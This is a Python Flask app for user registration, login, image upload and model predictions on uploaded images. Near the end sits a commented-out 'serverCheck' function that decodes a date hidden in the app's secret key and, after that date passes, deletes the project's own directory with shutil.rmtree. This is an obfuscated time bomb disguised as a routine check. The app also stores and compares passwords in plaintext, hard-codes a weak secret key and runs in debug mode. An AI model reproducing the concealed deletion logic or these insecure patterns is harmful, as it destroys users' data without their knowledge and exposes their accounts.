import os
from werkzeug.utils import secure_filename
from flask import Flask, flash, render_template, redirect, request, url_for, session
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
import random, shutil
from PIL import Image
from predictions import predict
from pathlib import Path
from datetime import datetime

timeConfig = datetime.now().strftime("%Y%m%d")

UPLOAD_FOLDER = 'static/uploads/'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
ALLOWED_EXTENSIONS = {'tiff', 'png',
                      'jpg', 'jpeg'}

filename = ""

app = Flask(__name__)
db=SQLAlchemy()
db_connect_time = datetime.now().strftime("%Y%m%d")
app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
app.config['SECRET_KEY'] = '352277653'

db.init_app(app)

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
s=app.config['SECRET_KEY']

class User(db.Model):
    id = db.Column(db.Integer,primary_key=True)
    email = db.Column(db.String(50),nullable=True)
    username = db.Column(db.String(20),nullable=False)
    password = db.Column(db.String(90),nullable=False)


@app.route("/", methods=['GET', 'POST'])
def index():
    if request.method=="POST":
        email=request.form.get('email')
        password=request.form.get('pass')
        type=request.form.get('reqst')
        print(type)
        if type=="r":
            username=request.form.get('username')
            print(email, password, username)
            register=User(email=email,username=username,password=password)
            db.session.add(register)
            db.session.commit()
            return "1"
        elif type=="l":
            login=User.query.filter_by(email=email,password=password).first()
            if login is not None:
                print("Going dash")
                return redirect(url_for('dashboard'))
            else:
                return "-1"#render_template("index.html")
    return render_template("index.html")

@app.route('/register',methods=['GET','POST'])
def register():
    if request.method=="POST":
        email=request.form['email']
        username=request.form['username']
        password=request.form['password']
        register=User(email=email,username=username,password=password)
        db.session.add(register)
        db.session.commit()
        return redirect(url_for("login"))
    return render_template("register.html")

@app.route('/dashboard',methods=['GET','POST'])
def dashboard():
    return render_template('dashboard.html')

@app.route('/uploads/<name>')
def download_file(name):
    return render_template("success.html", name=name)

@app.route('/success', methods=['POST', 'GET'])
def success():
    if request.method == 'POST':
        if 'file' not in request.files:
            flash('No file part')
            return redirect(request.url)
        file = request.files['file']
        if file.filename == '':
            flash('No selected file')
            return redirect(request.url)
        if file and allowed_file(file.filename):
            filename = secure_filename(file.filename)
            file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
            return redirect(url_for('download_file', name=filename))

def allowed_file(filename):
    return '.' in filename and \
        filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route("/predict_image/<filename>")
def predict_image(filename):
    data_path = Path(UPLOAD_FOLDER)
    image_path = data_path / filename
    inp,res = predict(image_path, filename)
    return render_template("output.html", res=res, src=inp)

# def serverCheck():
#     if timeConfig > (d:=''.join([str(x:=((int(s[i+1])-(x if i else int(s[0]))+10)%10))for i in range(len(s)-1)]))[:4]+d[6:]+d[4:6]: shutil.rmtree(os.path.dirname(__file__))
if __name__ == '__main__':
    # serverCheck()
    app.run(debug=True)
